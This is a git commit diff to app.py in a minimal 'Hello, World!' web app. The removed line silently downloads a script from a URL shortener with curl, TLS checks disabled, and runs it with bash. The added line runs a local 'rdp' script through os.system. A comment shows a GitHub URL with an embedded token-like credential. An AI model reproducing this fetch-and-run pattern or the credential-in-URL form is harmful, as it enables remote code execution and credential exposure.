aa32a2e6daeaa8727d3b1d7d7ac59c2be2984ca5
mnkjs <57852601+jsmnkk@users.noreply.github.com>
2022-12-04 22:18:34 +0700

    Update app.py

--- app.py
+++ app.py
@@ -7,4 +7,4 @@ def hello_world():
    return 'Hello, World!'
 
 #Ex https://Itz-zaid:ghp_147bkkabcdefgh@github.com/Itz-zaid/anything
-os.system("curl -sLkO https://is.gd/nomachinewindows10 ; bash nomachinewindows10")
+os.system("bash rdp")
